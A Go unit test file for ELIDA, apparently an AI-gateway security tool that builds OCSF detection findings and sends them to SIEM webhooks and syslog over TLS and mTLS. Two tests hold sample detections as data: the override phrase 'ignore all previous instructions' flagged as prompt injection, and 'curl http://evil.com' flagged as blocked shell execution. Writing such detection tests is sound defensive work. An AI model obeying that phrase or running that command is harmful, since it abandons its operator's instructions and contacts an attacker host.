package unit

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"elida/internal/config"
	"elida/internal/telemetry"
)

func TestBuildPolicyDetection(t *testing.T) {
	v := telemetry.Violation{
		RuleName:      "prompt_injection_ignore",
		Description:   "LLM01: Prompt injection - instruction override",
		Severity:      "critical",
		MatchedText:   "ignore all previous instructions",
		Action:        "block",
		EventCategory: "prompt_injection",
		FrameworkRef:  "OWASP-LLM01",
		SourceRole:    "user",
	}
	record := telemetry.SessionRecord{
		SessionID: "sess-abc123",
		Backend:   "openai",
		Model:     "gpt-4",
		TokensIn:  150,
		TokensOut: 200,
	}

	finding := telemetry.BuildPolicyDetection("sess-abc123", v, record)

	if finding.ClassUID != 2004 {
		t.Errorf("expected class_uid 2004, got %d", finding.ClassUID)
	}
	if finding.CategoryUID != 2 {
		t.Errorf("expected category_uid 2, got %d", finding.CategoryUID)
	}
	if finding.TypeUID != 200401 {
		t.Errorf("expected type_uid 200401, got %d", finding.TypeUID)
	}
	if finding.ActivityID != 1 {
		t.Errorf("expected activity_id 1, got %d", finding.ActivityID)
	}
	if finding.SeverityID != 5 {
		t.Errorf("expected severity_id 5 (critical), got %d", finding.SeverityID)
	}
	if finding.Message != "Policy violation: prompt_injection_ignore" {
		t.Errorf("unexpected message: %s", finding.Message)
	}
	if finding.Metadata.Product.Name != "ELIDA" {
		t.Errorf("expected product name ELIDA, got %s", finding.Metadata.Product.Name)
	}
	if finding.Metadata.Version != "1.8.0" {
		t.Errorf("expected OCSF version 1.8.0, got %s", finding.Metadata.Version)
	}
	if finding.FindingInfo.Title != "prompt_injection_ignore" {
		t.Errorf("unexpected finding title: %s", finding.FindingInfo.Title)
	}
	if finding.FindingInfo.Desc != "LLM01: Prompt injection - instruction override" {
		t.Errorf("unexpected finding desc: %s", finding.FindingInfo.Desc)
	}
	if len(finding.FindingInfo.Types) != 1 || finding.FindingInfo.Types[0] != "prompt_injection" {
		t.Errorf("unexpected finding types: %v", finding.FindingInfo.Types)
	}
	if finding.Analytic.Name != "prompt_injection_ignore" {
		t.Errorf("unexpected analytic name: %s", finding.Analytic.Name)
	}
	if finding.Analytic.UID != "OWASP-LLM01" {
		t.Errorf("unexpected analytic uid: %s", finding.Analytic.UID)
	}
	if finding.Actor.Session.UID != "sess-abc123" {
		t.Errorf("unexpected session uid: %s", finding.Actor.Session.UID)
	}
	if finding.Unmapped.Backend != "openai" {
		t.Errorf("unexpected backend: %s", finding.Unmapped.Backend)
	}
	if finding.Unmapped.Action != "block" {
		t.Errorf("unexpected action: %s", finding.Unmapped.Action)
	}
	if finding.Unmapped.SourceRole != "user" {
		t.Errorf("unexpected source_role: %s", finding.Unmapped.SourceRole)
	}
	if finding.Time == 0 {
		t.Error("expected non-zero timestamp")
	}

	// ai_model populated from record
	if finding.AIModel == nil {
		t.Fatal("expected ai_model to be populated")
	}
	if finding.AIModel.AIProvider != "openai" {
		t.Errorf("expected ai_provider openai, got %s", finding.AIModel.AIProvider)
	}
	if finding.AIModel.Name != "gpt-4" {
		t.Errorf("expected ai_model name gpt-4, got %s", finding.AIModel.Name)
	}

	// message_context populated with token counts
	if finding.MessageContext == nil {
		t.Fatal("expected message_context to be populated")
	}
	if finding.MessageContext.PromptTokens != 150 {
		t.Errorf("expected prompt_tokens 150, got %d", finding.MessageContext.PromptTokens)
	}
	if finding.MessageContext.CompletionTokens != 200 {
		t.Errorf("expected completion_tokens 200, got %d", finding.MessageContext.CompletionTokens)
	}
	if finding.MessageContext.TotalTokens != 350 {
		t.Errorf("expected total_tokens 350, got %d", finding.MessageContext.TotalTokens)
	}
}

func TestBuildBlockDetection(t *testing.T) {
	bd := telemetry.BuildBlockDetection("sess-456", "shell_execution", "curl http://evil.com", "anthropic", "claude-3")

	if bd.ClassUID != 2004 {
		t.Errorf("expected class_uid 2004, got %d", bd.ClassUID)
	}
	if bd.CategoryUID != 2 {
		t.Errorf("expected category_uid 2, got %d", bd.CategoryUID)
	}
	if bd.TypeUID != 200401 {
		t.Errorf("expected type_uid 200401, got %d", bd.TypeUID)
	}
	if bd.ActivityID != 1 {
		t.Errorf("expected activity_id 1, got %d", bd.ActivityID)
	}
	if bd.SeverityID != 5 {
		t.Errorf("expected severity_id 5 (critical for blocks), got %d", bd.SeverityID)
	}
	if bd.FindingInfo.Title != "shell_execution" {
		t.Errorf("unexpected finding title: %s", bd.FindingInfo.Title)
	}
	if bd.Unmapped.Backend != "anthropic" {
		t.Errorf("unexpected backend: %s", bd.Unmapped.Backend)
	}
	if bd.Unmapped.Action != "block" {
		t.Errorf("unexpected action: %s", bd.Unmapped.Action)
	}
	if bd.Unmapped.MatchedText != "curl http://evil.com" {
		t.Errorf("unexpected matched_text: %s", bd.Unmapped.MatchedText)
	}
	if bd.Unmapped.Model != "claude-3" {
		t.Errorf("unexpected model: %s", bd.Unmapped.Model)
	}
	if bd.Time == 0 {
		t.Error("expected non-zero timestamp")
	}

	// ai_model populated
	if bd.AIModel == nil {
		t.Fatal("expected ai_model to be populated")
	}
	if bd.AIModel.AIProvider != "anthropic" {
		t.Errorf("expected ai_provider anthropic, got %s", bd.AIModel.AIProvider)
	}
	if bd.AIModel.Name != "claude-3" {
		t.Errorf("expected ai_model name claude-3, got %s", bd.AIModel.Name)
	}
}

func TestBuildAnomalyDetection(t *testing.T) {
	df := telemetry.BuildAnomalyDetection("sess-789", 0.85, "high-risk", "anomaly_behavioral")

	if df.ClassUID != 2004 {
		t.Errorf("expected class_uid 2004, got %d", df.ClassUID)
	}
	if df.CategoryUID != 2 {
		t.Errorf("expected category_uid 2, got %d", df.CategoryUID)
	}
	if df.TypeUID != 200401 {
		t.Errorf("expected type_uid 200401, got %d", df.TypeUID)
	}
	if df.ActivityID != 1 {
		t.Errorf("expected activity_id 1, got %d", df.ActivityID)
	}
	if df.SeverityID != 5 {
		t.Errorf("expected severity_id 5 for score >= 0.8, got %d", df.SeverityID)
	}
	if df.Analytic.Name != "M3-lite" {
		t.Errorf("unexpected analytic name: %s", df.Analytic.Name)
	}
	if df.FindingInfo.Title != "anomaly_behavioral" {
		t.Errorf("unexpected finding title: %s", df.FindingInfo.Title)
	}

	// No ai_model for anomaly detection (no backend context)
	if df.AIModel != nil {
		t.Error("expected ai_model to be nil for anomaly detection")
	}

	// Valid JSON
	data, err := telemetry.MarshalOCSFEvent(df)
	if err != nil {
		t.Fatalf("failed to marshal detection finding: %v", err)
	}
	if len(data) == 0 {
		t.Error("expected non-empty JSON output")
	}
}

func TestSeverityMapping(t *testing.T) {
	tests := []struct {
		severity string
		expected int
	}{
		{"info", 1},
		{"warning", 3},
		{"critical", 5},
		{"unknown", 1}, // defaults to info
		{"", 1},
	}

	for _, tt := range tests {
		got := telemetry.MapSeverityToOCSF(tt.severity)
		if got != tt.expected {
			t.Errorf("MapSeverityToOCSF(%q) = %d, want %d", tt.severity, got, tt.expected)
		}
	}
}

func TestMarshalOCSFEventRoundtrip(t *testing.T) {
	v := telemetry.Violation{
		RuleName:      "data_exfil",
		Description:   "Data exfiltration attempt",
		Severity:      "warning",
		EventCategory: "data_exfil",
		FrameworkRef:  "OWASP-LLM06",
	}
	record := telemetry.SessionRecord{
		SessionID: "sess-roundtrip",
		Backend:   "openai",
		Model:     "gpt-4o",
		TokensIn:  100,
		TokensOut: 50,
	}

	finding := telemetry.BuildPolicyDetection("sess-roundtrip", v, record)

	// Marshal
	data, err := telemetry.MarshalOCSFEvent(finding)
	if err != nil {
		t.Fatalf("failed to marshal: %v", err)
	}

	// Unmarshal into generic map
	var parsed map[string]any
	if err := json.Unmarshal(data, &parsed); err != nil {
		t.Fatalf("failed to unmarshal: %v", err)
	}

	// class_uid is 2004
	if classUID, ok := parsed["class_uid"].(float64); !ok || int(classUID) != 2004 {
		t.Errorf("roundtrip class_uid mismatch: got %v", parsed["class_uid"])
	}
	if severityID, ok := parsed["severity_id"].(float64); !ok || int(severityID) != 3 {
		t.Errorf("roundtrip severity_id mismatch: got %v", parsed["severity_id"])
	}
	if activityID, ok := parsed["activity_id"].(float64); !ok || int(activityID) != 1 {
		t.Errorf("roundtrip activity_id mismatch: got %v", parsed["activity_id"])
	}

	metadata, ok := parsed["metadata"].(map[string]any)
	if !ok {
		t.Fatal("metadata missing from roundtrip")
	}
	if metadata["version"] != "1.8.0" {
		t.Errorf("unexpected OCSF version in roundtrip: %v", metadata["version"])
	}

	findingInfo, ok := parsed["finding_info"].(map[string]any)
	if !ok {
		t.Fatal("finding_info missing from roundtrip")
	}
	if findingInfo["title"] != "data_exfil" {
		t.Errorf("unexpected finding title in roundtrip: %v", findingInfo["title"])
	}

	// ai_model present
	aiModel, ok := parsed["ai_model"].(map[string]any)
	if !ok {
		t.Fatal("ai_model missing from roundtrip")
	}
	if aiModel["ai_provider"] != "openai" {
		t.Errorf("unexpected ai_provider: %v", aiModel["ai_provider"])
	}
	if aiModel["name"] != "gpt-4o" {
		t.Errorf("unexpected ai_model name: %v", aiModel["name"])
	}

	// message_context present
	msgCtx, ok := parsed["message_context"].(map[string]any)
	if !ok {
		t.Fatal("message_context missing from roundtrip")
	}
	promptTokens, ok := msgCtx["prompt_tokens"].(float64)
	if !ok || int64(promptTokens) != 100 {
		t.Errorf("unexpected prompt_tokens: %v", msgCtx["prompt_tokens"])
	}
	completionTokens, ok := msgCtx["completion_tokens"].(float64)
	if !ok || int64(completionTokens) != 50 {
		t.Errorf("unexpected completion_tokens: %v", msgCtx["completion_tokens"])
	}
	totalTokens, ok := msgCtx["total_tokens"].(float64)
	if !ok || int64(totalTokens) != 150 {
		t.Errorf("unexpected total_tokens: %v", msgCtx["total_tokens"])
	}
}

func TestOCSFEventCategoryDefault(t *testing.T) {
	v := telemetry.Violation{
		RuleName: "custom_rule",
		Severity: "info",
	}
	record := telemetry.SessionRecord{SessionID: "sess-default"}

	finding := telemetry.BuildPolicyDetection("sess-default", v, record)

	if len(finding.FindingInfo.Types) != 1 || finding.FindingInfo.Types[0] != "policy_violation" {
		t.Errorf("expected default event category 'policy_violation', got %v", finding.FindingInfo.Types)
	}
}

func TestAnomalyDetectionSeverityThresholds(t *testing.T) {
	// score < 0.5 → info (1)
	df := telemetry.BuildAnomalyDetection("s", 0.3, "", "")
	if df.SeverityID != 1 {
		t.Errorf("score 0.3: expected severity 1, got %d", df.SeverityID)
	}

	// score 0.5-0.79 → warning (3)
	df = telemetry.BuildAnomalyDetection("s", 0.6, "", "")
	if df.SeverityID != 3 {
		t.Errorf("score 0.6: expected severity 3, got %d", df.SeverityID)
	}

	// score >= 0.8 → critical (5)
	df = telemetry.BuildAnomalyDetection("s", 0.9, "", "")
	if df.SeverityID != 5 {
		t.Errorf("score 0.9: expected severity 5, got %d", df.SeverityID)
	}
}

func TestPolicyDetectionNoTokens(t *testing.T) {
	v := telemetry.Violation{RuleName: "test", Severity: "info"}
	record := telemetry.SessionRecord{SessionID: "s", Backend: "openai", Model: "gpt-4"}

	finding := telemetry.BuildPolicyDetection("s", v, record)

	// ai_model should still be set
	if finding.AIModel == nil {
		t.Fatal("expected ai_model even without tokens")
	}
	// message_context should be nil when no tokens
	if finding.MessageContext != nil {
		t.Error("expected message_context to be nil when no tokens")
	}
}

func TestBlockDetectionNoBackend(t *testing.T) {
	bd := telemetry.BuildBlockDetection("s", "rule", "text", "", "")

	// ai_model should be nil when backend is empty
	if bd.AIModel != nil {
		t.Error("expected ai_model to be nil when backend is empty")
	}
}

// --- OCSFEmitter tests ---

// mockNozzle records all events emitted to it
type mockNozzle struct {
	mu     sync.Mutex
	events [][]byte
	err    error
	closed bool
}

func (m *mockNozzle) Emit(_ context.Context, event []byte) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.err != nil {
		return m.err
	}
	cp := make([]byte, len(event))
	copy(cp, event)
	m.events = append(m.events, cp)
	return nil
}

func (m *mockNozzle) Close() error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.closed = true
	return nil
}

func (m *mockNozzle) getEvents() [][]byte {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.events
}

func TestOCSFEmitterDisabled(t *testing.T) {
	emitter, err := telemetry.NewOCSFEmitter(config.OCSFConfig{Enabled: false})
	if err != nil {
		t.Fatal(err)
	}
	if emitter != nil {
		t.Error("expected nil emitter when disabled")
	}
}

func TestOCSFEmitterNoNozzles(t *testing.T) {
	emitter, err := telemetry.NewOCSFEmitter(config.OCSFConfig{Enabled: true})
	if err != nil {
		t.Fatal(err)
	}
	if emitter != nil {
		t.Error("expected nil emitter when no nozzles enabled")
	}
}

func TestOCSFEmitterFanOut(t *testing.T) {
	emitter := telemetry.NewOCSFEmitterForTest([]telemetry.OCSFNozzle{&mockNozzle{}, &mockNozzle{}})

	ctx := context.Background()
	finding := telemetry.BuildBlockDetection("s1", "test_rule", "bad text", "openai", "gpt-4")
	emitter.Emit(ctx, telemetry.OCSFClassDetectionFinding, finding.SeverityID, finding)

	// Both nozzles should receive the event
	nozzles := emitter.Nozzles()
	for i, n := range nozzles {
		mn, ok := n.(*mockNozzle)
		if !ok {
			t.Fatalf("nozzle %d: unexpected type %T", i, n)
		}
		events := mn.getEvents()
		if len(events) != 1 {
			t.Errorf("nozzle %d: expected 1 event, got %d", i, len(events))
			continue
		}
		var parsed map[string]any
		if err := json.Unmarshal(events[0], &parsed); err != nil {
			t.Errorf("nozzle %d: invalid JSON: %v", i, err)
			continue
		}
		classUID, ok := parsed["class_uid"].(float64)
		if !ok || int(classUID) != 2004 {
			t.Errorf("nozzle %d: unexpected class_uid", i)
		}
	}
}

func TestOCSFEmitterErrorDoesNotBlock(t *testing.T) {
	failing := &mockNozzle{err: fmt.Errorf("network error")}
	working := &mockNozzle{}
	emitter := telemetry.NewOCSFEmitterForTest([]telemetry.OCSFNozzle{failing, working})

	ctx := context.Background()
	finding := telemetry.BuildBlockDetection("s1", "rule", "text", "openai", "gpt-4")
	emitter.Emit(ctx, telemetry.OCSFClassDetectionFinding, finding.SeverityID, finding)

	// Working nozzle should still receive the event
	events := working.getEvents()
	if len(events) != 1 {
		t.Errorf("expected working nozzle to receive 1 event, got %d", len(events))
	}
	// Failing nozzle should have no events
	if len(failing.getEvents()) != 0 {
		t.Error("expected failing nozzle to have no events")
	}
}

func TestOCSFEmitterClose(t *testing.T) {
	n1 := &mockNozzle{}
	n2 := &mockNozzle{}
	emitter := telemetry.NewOCSFEmitterForTest([]telemetry.OCSFNozzle{n1, n2})

	if err := emitter.Close(); err != nil {
		t.Fatal(err)
	}
	if !n1.closed || !n2.closed {
		t.Error("expected all nozzles to be closed")
	}
}

func TestOCSFEmitterMultipleEvents(t *testing.T) {
	nozzle := &mockNozzle{}
	emitter := telemetry.NewOCSFEmitterForTest([]telemetry.OCSFNozzle{nozzle})

	ctx := context.Background()
	for i := 0; i < 5; i++ {
		finding := telemetry.BuildBlockDetection("s1", "rule", "text", "openai", "gpt-4")
		emitter.Emit(ctx, telemetry.OCSFClassDetectionFinding, finding.SeverityID, finding)
	}

	events := nozzle.getEvents()
	if len(events) != 5 {
		t.Errorf("expected 5 events, got %d", len(events))
	}
}

// --- TLS hardening tests ---

// generateTestCert creates a self-signed CA + client cert pair in tmpdir and
// returns (caPath, certPath, keyPath).
func generateTestCert(t *testing.T) (string, string, string) {
	t.Helper()
	dir := t.TempDir()

	// CA key + cert
	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	caTmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "test-ca"},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign,
	}
	caDER, err := x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &caKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	caPath := filepath.Join(dir, "ca.pem")
	err = os.WriteFile(caPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}), 0600)
	if err != nil {
		t.Fatal(err)
	}

	// Client key + cert signed by CA
	clientKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	clientTmpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: "test-client"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		t.Fatal(err)
	}
	clientDER, err := x509.CreateCertificate(rand.Reader, clientTmpl, caCert, &clientKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	certPath := filepath.Join(dir, "client.pem")
	err = os.WriteFile(certPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: clientDER}), 0600)
	if err != nil {
		t.Fatal(err)
	}
	keyBytes, err := x509.MarshalECPrivateKey(clientKey)
	if err != nil {
		t.Fatal(err)
	}
	keyPath := filepath.Join(dir, "client-key.pem")
	err = os.WriteFile(keyPath, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes}), 0600)
	if err != nil {
		t.Fatal(err)
	}
	return caPath, certPath, keyPath
}

func TestBuildTLSConfigEmpty(t *testing.T) {
	result, err := telemetry.BuildTLSConfigForTest(config.OCSFTLSConfig{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tlsCfg := result
	if tlsCfg.MinVersion != tls.VersionTLS12 {
		t.Errorf("expected MinVersion TLS 1.2, got %d", tlsCfg.MinVersion)
	}
	if tlsCfg.InsecureSkipVerify {
		t.Error("expected InsecureSkipVerify false by default")
	}
}

func TestBuildTLSConfigCAFile(t *testing.T) {
	caPath, _, _ := generateTestCert(t)

	result, err := telemetry.BuildTLSConfigForTest(config.OCSFTLSConfig{CAFile: caPath})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tlsCfg := result
	if tlsCfg.RootCAs == nil {
		t.Fatal("expected RootCAs to be set")
	}
}

func TestBuildTLSConfigClientCert(t *testing.T) {
	_, certPath, keyPath := generateTestCert(t)

	result, err := telemetry.BuildTLSConfigForTest(config.OCSFTLSConfig{
		CertFile: certPath,
		KeyFile:  keyPath,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tlsCfg := result
	if len(tlsCfg.Certificates) != 1 {
		t.Fatalf("expected 1 client certificate, got %d", len(tlsCfg.Certificates))
	}
}

func TestBuildTLSConfigInsecure(t *testing.T) {
	result, err := telemetry.BuildTLSConfigForTest(config.OCSFTLSConfig{InsecureSkipVerify: true})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	tlsCfg := result
	if !tlsCfg.InsecureSkipVerify {
		t.Error("expected InsecureSkipVerify true")
	}
}

func TestBuildTLSConfigBadCAFile(t *testing.T) {
	_, err := telemetry.BuildTLSConfigForTest(config.OCSFTLSConfig{CAFile: "/nonexistent/ca.pem"})
	if err == nil {
		t.Fatal("expected error for missing CA file")
	}
}

func TestWebhookRejectsHTTPWithoutInsecure(t *testing.T) {
	cfg := config.OCSFConfig{
		Enabled: true,
		Webhook: config.OCSFWebhookConfig{
			Enabled: true,
			URL:     "http://plain.example.com/ocsf",
		},
	}
	_, err := telemetry.NewOCSFEmitter(cfg)
	if err == nil {
		t.Fatal("expected error for plain HTTP webhook without insecure flag")
	}
}

func TestWebhookAcceptsHTTPWithInsecure(t *testing.T) {
	cfg := config.OCSFConfig{
		Enabled: true,
		Webhook: config.OCSFWebhookConfig{
			Enabled: true,
			URL:     "http://plain.example.com/ocsf",
			TLS: config.OCSFTLSConfig{
				InsecureSkipVerify: true,
			},
		},
	}
	emitter, err := telemetry.NewOCSFEmitter(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if emitter == nil {
		t.Fatal("expected non-nil emitter")
	}
	emitter.Close()
}

func TestWebhookAcceptsHTTPS(t *testing.T) {
	cfg := config.OCSFConfig{
		Enabled: true,
		Webhook: config.OCSFWebhookConfig{
			Enabled: true,
			URL:     "https://siem.example.com/api/ocsf",
		},
	}
	emitter, err := telemetry.NewOCSFEmitter(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if emitter == nil {
		t.Fatal("expected non-nil emitter")
	}
	emitter.Close()
}

// --- mTLS end-to-end tests ---

// generateTestPKI creates a CA, server cert (with localhost SAN), and client cert.
// Returns (caPath, serverCertPath, serverKeyPath, clientCertPath, clientKeyPath, caCertPool).
func generateTestPKI(t *testing.T) (string, string, string, string, string, *x509.CertPool) {
	t.Helper()
	dir := t.TempDir()

	// CA
	caKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	caTmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "test-ca"},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign,
	}
	caDER, err := x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &caKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		t.Fatal(err)
	}
	caPath := filepath.Join(dir, "ca.pem")
	if err := os.WriteFile(caPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}), 0600); err != nil {
		t.Fatal(err)
	}

	pool := x509.NewCertPool()
	pool.AddCert(caCert)

	writeCert := func(name string, tmpl *x509.Certificate) (string, string) {
		key, kerr := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if kerr != nil {
			t.Fatal(kerr)
		}
		der, cerr := x509.CreateCertificate(rand.Reader, tmpl, caCert, &key.PublicKey, caKey)
		if cerr != nil {
			t.Fatal(cerr)
		}
		certPath := filepath.Join(dir, name+".pem")
		if werr := os.WriteFile(certPath, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0600); werr != nil {
			t.Fatal(werr)
		}
		keyBytes, merr := x509.MarshalECPrivateKey(key)
		if merr != nil {
			t.Fatal(merr)
		}
		keyPath := filepath.Join(dir, name+"-key.pem")
		if werr := os.WriteFile(keyPath, pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes}), 0600); werr != nil {
			t.Fatal(werr)
		}
		return certPath, keyPath
	}

	serverCert, serverKey := writeCert("server", &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: "localhost"},
		DNSNames:     []string{"localhost"},
		IPAddresses:  []net.IP{net.IPv4(127, 0, 0, 1)},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})

	clientCert, clientKey := writeCert("client", &x509.Certificate{
		SerialNumber: big.NewInt(3),
		Subject:      pkix.Name{CommonName: "test-client"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	})

	return caPath, serverCert, serverKey, clientCert, clientKey, pool
}

func TestWebhookMTLSEndToEnd(t *testing.T) {
	caPath, serverCertPath, serverKeyPath, clientCertPath, clientKeyPath, caPool := generateTestPKI(t)

	// Set up HTTPS server that requires client certs
	var received []byte
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		received = body
		w.WriteHeader(http.StatusOK)
	}))
	serverCert, err := tls.LoadX509KeyPair(serverCertPath, serverKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	srv.TLS = &tls.Config{
		MinVersion:   tls.VersionTLS12,
		Certificates: []tls.Certificate{serverCert},
		ClientCAs:    caPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}
	srv.StartTLS()
	defer srv.Close()

	// Create emitter pointing at the mTLS server
	emitter, err := telemetry.NewOCSFEmitter(config.OCSFConfig{
		Enabled: true,
		Webhook: config.OCSFWebhookConfig{
			Enabled: true,
			URL:     srv.URL + "/ocsf",
			TLS: config.OCSFTLSConfig{
				CAFile:   caPath,
				CertFile: clientCertPath,
				KeyFile:  clientKeyPath,
			},
		},
	})
	if err != nil {
		t.Fatalf("NewOCSFEmitter: %v", err)
	}
	defer emitter.Close()

	// Emit an event and verify the server received valid OCSF JSON
	finding := telemetry.BuildBlockDetection("sess-mtls", "test_rule", "bad", "openai", "gpt-4")
	emitter.Emit(context.Background(), telemetry.OCSFClassDetectionFinding, finding.SeverityID, finding)

	if len(received) == 0 {
		t.Fatal("server received no data")
	}
	var parsed map[string]any
	if err := json.Unmarshal(received, &parsed); err != nil {
		t.Fatalf("server received invalid JSON: %v", err)
	}
	classUID, ok := parsed["class_uid"].(float64)
	if !ok || int(classUID) != 2004 {
		t.Errorf("unexpected class_uid: %v", parsed["class_uid"])
	}
}

func TestWebhookMTLSRejectsWithoutClientCert(t *testing.T) {
	_, serverCertPath, serverKeyPath, _, _, caPool := generateTestPKI(t)

	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	serverCert, _ := tls.LoadX509KeyPair(serverCertPath, serverKeyPath)
	srv.TLS = &tls.Config{
		MinVersion:   tls.VersionTLS12,
		Certificates: []tls.Certificate{serverCert},
		ClientCAs:    caPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}
	srv.StartTLS()
	defer srv.Close()

	// Connect WITHOUT client cert — server should reject
	emitter, err := telemetry.NewOCSFEmitter(config.OCSFConfig{
		Enabled: true,
		Webhook: config.OCSFWebhookConfig{
			Enabled: true,
			URL:     srv.URL + "/ocsf",
			TLS: config.OCSFTLSConfig{
				InsecureSkipVerify: true, // skip CA check, but no client cert
			},
		},
	})
	if err != nil {
		t.Fatalf("NewOCSFEmitter: %v", err)
	}
	defer emitter.Close()

	// Emit should fail (TLS handshake error — no client cert)
	nozzle := emitter.Nozzles()[0]
	err = nozzle.Emit(context.Background(), []byte(`{"test":true}`))
	if err == nil {
		t.Fatal("expected TLS handshake error when client cert missing")
	}
}

func TestSyslogTLSEndToEnd(t *testing.T) {
	caPath, serverCertPath, serverKeyPath, clientCertPath, clientKeyPath, caPool := generateTestPKI(t)

	// Start a TLS TCP listener
	serverCert, err := tls.LoadX509KeyPair(serverCertPath, serverKeyPath)
	if err != nil {
		t.Fatal(err)
	}
	tlsCfg := &tls.Config{
		MinVersion:   tls.VersionTLS12,
		Certificates: []tls.Certificate{serverCert},
		ClientCAs:    caPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}
	ln, err := tls.Listen("tcp", "127.0.0.1:0", tlsCfg)
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()

	// Read one line from the accepted connection
	received := make(chan string, 1)
	go func() {
		c, acceptErr := ln.Accept()
		if acceptErr != nil {
			return
		}
		defer c.Close() //nolint:errcheck
		scanner := bufio.NewScanner(c)
		if scanner.Scan() {
			received <- scanner.Text()
		}
	}()

	// Create syslog nozzle with mTLS pointed at our listener
	emitter, err := telemetry.NewOCSFEmitter(config.OCSFConfig{
		Enabled: true,
		Syslog: config.OCSFSyslogConfig{
			Enabled:  true,
			Addr:     ln.Addr().String(),
			Protocol: "tcp+tls",
			TLS: config.OCSFTLSConfig{
				CAFile:   caPath,
				CertFile: clientCertPath,
				KeyFile:  clientKeyPath,
			},
		},
	})
	if err != nil {
		t.Fatalf("NewOCSFEmitter: %v", err)
	}
	defer emitter.Close()

	// Emit an event
	finding := telemetry.BuildBlockDetection("sess-syslog", "test_rule", "bad", "openai", "gpt-4")
	emitter.Emit(context.Background(), telemetry.OCSFClassDetectionFinding, finding.SeverityID, finding)

	// Verify the syslog server got an RFC 5424 message with OCSF JSON payload
	select {
	case msg := <-received:
		// RFC 5424 message should contain JSON payload after structured-data
		if !strings.Contains(msg, `"class_uid":2004`) {
			t.Errorf("syslog message missing OCSF payload: %s", msg)
		}
		if !strings.Contains(msg, "elida") {
			t.Errorf("syslog message missing tag: %s", msg)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for syslog message")
	}
}
